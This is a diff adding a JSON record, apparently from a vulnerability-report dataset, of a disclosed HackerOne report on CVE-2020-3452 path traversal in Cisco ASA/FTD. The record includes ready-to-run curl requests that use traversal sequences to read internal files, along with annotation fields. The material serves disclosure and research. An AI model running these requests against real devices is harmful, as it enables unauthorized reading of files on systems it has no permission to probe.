@@ -1,0 +1,38 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "un4gi ",
+  "title": "Path traversal on https://\u2588\u2588\u2588 allows arbitrary file read (CVE-2020-3452)",
+  "content": "\nSummary:\nAccording to Cisco:\nA vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system.\nThe vulnerability is due to a lack of proper input validation of URLs in HTTP requests processed by an affected device. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device. A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device.\nThe web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files.\nAn advisory can be found at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86\nStep-by-step Reproduction Instructions\nIn bash, use curl -k \"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\" to prove you can read internal files such as the /+CSCOE+/portal_inc.lua file.\nVarious internal files can be read, and some require using the --output command to output the binary data to a file as shown below:\nCode 143 Bytes\n1curl -k \"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../\" --output session.js\nSuggested Mitigation/Remediation Actions\nUpdate the software to the latest version via the Cisco advisory linked above.\nImpact\nA successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device.\nThe web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1597356540,
+  "report_url": "https://hackerone.com/reports/936399",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Use curl to send a crafted HTTP request with directory traversal sequences to the target device: curl -k \"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\""
+    ],
+    [
+      2,
+      "For binary files, use the --output flag to save the response to a file: curl -k \"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../\" --output session.js"
+    ]
+  ],
+  "vuln_description": "A directory traversal vulnerability in Cisco ASA and FTD software allows unauthenticated remote attackers to read arbitrary files within the web services file system by sending crafted HTTP requests with directory traversal sequences. The vulnerability is due to improper input validation of URLs in HTTP requests.",
+  "reason": "The vulnerability involves a straightforward directory traversal attack with no complex interactions or state manipulations. The attack requires crafting a URL with traversal sequences, which is a well-known technique. The only non-trivial aspect is knowing the specific endpoint and parameter structure, but this is relatively simple to discover.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
